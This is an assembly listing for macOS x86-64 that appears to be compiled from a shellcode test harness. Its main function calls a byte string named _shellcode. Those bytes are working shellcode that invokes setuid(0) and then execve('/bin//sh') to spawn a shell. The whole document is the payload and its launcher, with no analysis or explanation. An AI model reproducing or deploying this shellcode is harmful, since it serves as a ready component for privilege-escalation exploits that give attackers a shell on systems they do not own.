	.section	__TEXT,__text,regular,pure_instructions
	.macosx_version_min 10, 10
	.globl	_main
	.align	4, 0x90
_main:                                  ## @main
	.cfi_startproc
## BB#0:
	pushq	%rbp
Ltmp0:
	.cfi_def_cfa_offset 16
Ltmp1:
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
Ltmp2:
	.cfi_def_cfa_register %rbp
	subq	$16, %rsp
	leaq	_shellcode(%rip), %rax
	movq	%rax, -8(%rbp)
	callq	*-8(%rbp)
	xorl	%eax, %eax
	addq	$16, %rsp
	popq	%rbp
	retq
	.cfi_endproc

	.section	__TEXT,__const
	.globl	_shellcode              ## @shellcode
	.align	4
_shellcode:
	.asciz	"A\260\002I\301\340\030I\203\310\0271\377L\211\300\017\005\353\022_I\203\300$L\211\300H1\322RWH\211\346\017\005\350\351\377\377\377/bin//sh"


.subsections_via_symbols
